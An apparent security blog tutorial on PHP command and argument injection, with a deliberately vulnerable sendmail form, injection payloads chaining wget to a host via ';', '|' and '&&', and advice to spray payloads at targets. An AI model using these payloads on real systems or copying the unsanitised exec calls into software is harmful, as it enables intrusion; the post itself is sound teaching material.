---
layout: post
title:  "PHP Command Injection and Argument Injection"
categories: TheoricalPractise 
tags:  CommandI ArgumentI PHP
author: AlvaroFolgado
---

* content
{:toc}


## Introduction

This is the first post inside the category “TheoricalPractise”. In these series I will use information around internet to build a working Proof of Concept and test dangerous functions in different languages with the objective to understand basic Web Exploitation vectors.
In this chapter I have built a PoC in relation with Command Injection and Argument Injection, in PHP language.
Existent PoC can be acceded [here](http://afolgado.com/poc/)

## Command Injection VS Argument Injection

Since this is the first post where I speak about these two attack vectors let’s explain very simply how they work.
Command Injection is possible when we provide to any kind of command interpreter as sh/bash/cmd a String directly coming from a user Input without any kind of control. Vulnerable code example:

```php
popen("/usr/bin/touch ".$userInput,"r");
shell_exec("/usr/bin/touch ".$userInput);
passthru("/usr/bin/touch ".$userInput);
[...]
```

In this last functions, if the user has access to $userInput String, we could perform an attack of the style:

```bash
"ss@email.com;wget http://127.0.0.1/test"
"ss@email.com|wget http://127.0.0.1/test"
"ss@email.com&&wget http://127.0.0.1/test"
[...]
```


On the other hand, an Argument Injection is different; in this time this is produced when we pass arguments to a process call, and these arguments are created using Strings from an uncontrolled user Input Source.
 
```php
$escapedUserInput = escapeshellcmd($userInput);

popen("/usr/bin/touch ".$userInput,"r");
shell_exec("/usr/bin/touch ".$userInput);
passthru("/usr/bin/touch ".$userInput);
[...]
```

In an argument Injection the ability of exploit the vulnerability depends in the behavior of the target process call, since we only can normally inject more parameters and arguments to the binary, knowledge about the target binary and the ability of exploit it, will be key if we want to execute code in target server. On the other hand, a command Injection is very easy to exploit normally in comparation.

A useful way to depurate Argument Injections when we know which binary is being called, is by changing target binary with following script:

```bash
#!/bin/bash
cat > /tmp/outgoing-command

echo Received: $0 >> /tmp/outgoing-command
echo Received: $1 >> /tmp/outgoing-command
echo Received: $2 >> /tmp/outgoing-command
echo Received: $3 >> /tmp/outgoing-command
echo Received: $4 >> /tmp/outgoing-command
echo Received: $5 >> /tmp/outgoing-command
echo Received: $6 >> /tmp/outgoing-command
echo Received: $7 >> /tmp/outgoing-command
echo Received: $8 >> /tmp/outgoing-command
echo Received: $9 >> /tmp/outgoing-command

#... whatever more args we should like to capture
```

This will help us to understand what is being passed from the web app side to the operating system process.
Also particularly in PHP, we can use “error_log(string,0)” to log information inside /var/log/apache/error.log. This help us for research objectives in the future.

## Proof of concept: Command Injection

With the objective to test this in practise I created a very simple PHP webapp to test this. The code simply call "sendmail" from the default Operating system (tested on ubuntu) concatenating a userInput String. This dangerous String is the "emailFrom" input.

```php
if (isset($_POST['emailFrom']) and isset($_POST['emailTo']) and isset($_POST['body']) and !strcmp($_POST['submit'],'Command Injection')){

	$emailTo = $_POST['emailTo'];

	$emailFrom = $_POST['emailFrom'];

	$body = $_POST['body'];


//Command injection vulnerability, pick up your method!
//CommandI are possible when we pass a user input String without any kind of control to a bash/sh/cmd. These softwares detect some symbols as ";|&." in a special way, so we can trick it to run more commands as the one is supposed to be executed.

//Payload1 used here!

//Popen call pipe to the target process, is totally Command Injectable
//popen("/usr/sbin/sendmail -f".$emailFrom,"r");

//Same as Popen!
//shell_exec("/usr/sbin/sendmail -f".$emailFrom);

//Same as Popen!
//passthru("/usr/sbin/sendmail -f".$emailFrom);

//Same as Popen!
exec("/usr/sbin/sendmail -f".$emailFrom);

[...]
```
By providing previous payloads into "emailFrom" to the form and clicking "Command Injection" we can run extra commands providing special shell characters.

Accessing to /var/log/apache2/access.log we can see that the "wget" command is being performed correctly.



## Proof of concept: Argument Injection

to-do

## Conclussions
As an **attacker** perspective, if we see data that could be passed as a string to a dangerous function like the following URL:
```js
http://example.com/action?ping=<IP-STRING>
```
We should try a bunch of command Injection Payloads for linux/windows based operating system and look if our external server has been reached.Argument Injection is much trickier, for that we will need to figure out vulnerable 3PP (third party library software) used by target web application.

As a **defensive** perspective, is the only way to solve any of our problems is by doing a OS call using dangerous function, better to correctly escape/depurate it before passing directly to these functions.
The Dangerous Funtions that I know so far will be listed [here](http://afolgado.com/hackinguide/)

## Documentation

[LegalHackers Mailer Exploit](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)

[OWASP](https://www.owasp.org/index.php/Main_Page)

